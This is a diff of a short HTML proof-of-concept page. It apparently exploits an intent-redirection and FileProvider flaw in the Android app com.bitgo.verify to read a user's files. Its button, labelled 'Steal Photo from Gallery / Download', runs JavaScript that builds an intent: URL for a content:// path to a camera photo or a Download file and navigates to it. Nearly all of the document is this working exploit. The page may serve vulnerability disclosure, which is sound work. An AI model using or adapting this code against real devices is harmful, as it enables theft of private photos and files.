@@ -1,16 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>BitGo FileProvider Remote Read PoC</title>
+    <title>BitGo FileProvider Remote PoC</title>
+    <meta charset="utf-8">
 </head>
-<body>
-    <h1>BitGo FileProvider Remote File Read PoC</h1>
-    <p>Click the button below to trigger BitGo to read your gallery photo via Intent Redirection.</p>
-    <button onclick="triggerIntent()" style="font-size:18px;padding:15px 30px;">Steal Photo from Gallery</button>
+<body style="font-family: Arial; text-align: center; padding: 50px;">
+    <h1>BitGo Verify — Remote File Read PoC</h1>
+    <p>کلیک کن تا BitGo فایل fery.png را از Download بخواند (Remote Intent Redirection)</p>
+    <button onclick="trigger()" 
+            style="padding: 20px 40px; font-size: 20px; background: #000; color: #fff; border: none; border-radius: 8px; cursor: pointer;">
+        Steal Photo from Gallery / Download
+    </button>
 
     <script>
-        function triggerIntent() {
-            const uri = "content://com.bitgo.verify.fileprovider/shared/DCIM/Camera/IMG_20251130_084156.jpg";
+        function trigger() {
+            const uri = "content://com.bitgo.verify.fileprovider/shared/Download/fery.png";
             const intentUrl = `intent:#Intent;action=android.intent.action.VIEW;data=${encodeURIComponent(uri)};end`;
             window.location.href = intentUrl;
         }
